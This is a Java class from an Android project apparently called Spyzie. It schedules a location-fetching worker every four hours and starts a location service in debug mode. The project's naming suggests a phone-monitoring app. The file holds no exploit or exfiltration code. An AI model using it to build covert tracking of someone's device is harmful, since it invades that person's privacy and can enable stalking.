package com.tantd.spyzie.data.device;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;

import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.device.worker.GetLocationWorker;
import com.tantd.spyzie.di.ApplicationContext;
import com.tantd.spyzie.service.LocationService;
import com.tantd.spyzie.util.Constants;

import java.util.concurrent.TimeUnit;

import javax.inject.Inject;

public class AppDeviceDataManager implements DeviceDataManager {

    @Inject
    @ApplicationContext
    Context mContext;

    private static final int UPDATE_PERIOD = 4;
    private static final String FETCH_DEVCIE_LOCATION = "FETCH_DEVCIE_LOCATION";

    private static AppDeviceDataManager sInstance;

    private OneTimeWorkRequest mOneTimeWorkRequest;
    private PeriodicWorkRequest mPeriodicWorkRequest;

    public static synchronized AppDeviceDataManager getInstance() {
        if (sInstance == null) {
            sInstance = new AppDeviceDataManager();
        }
        return sInstance;
    }

    private AppDeviceDataManager() {
        Data input = new Data.Builder().putInt("start_input", 3).putInt("count", 60).build();
        mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(GetLocationWorker.class).setInputData(input).build();
        mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(GetLocationWorker.class, UPDATE_PERIOD, TimeUnit.HOURS).build();
    }

    @Override
    public void startFetchingDeviceData() {
        Log.d(Constants.LOG_TAG, "[AppDeviceDataManager] startFetchingDeviceData");
        if (Constants.IS_DEBUG_MODE) {
//            WorkManager.getInstance(mContext).enqueueUniqueWork(FETCH_DEVCIE_LOCATION, ExistingWorkPolicy.KEEP, mOneTimeWorkRequest);
            Intent intent = new Intent(SpyzieApplication.getInstance(), LocationService.class);
            intent.putExtra("input", "Spyzie service");
            SpyzieApplication.getInstance().startService(intent);
        } else {

        }

    }
}
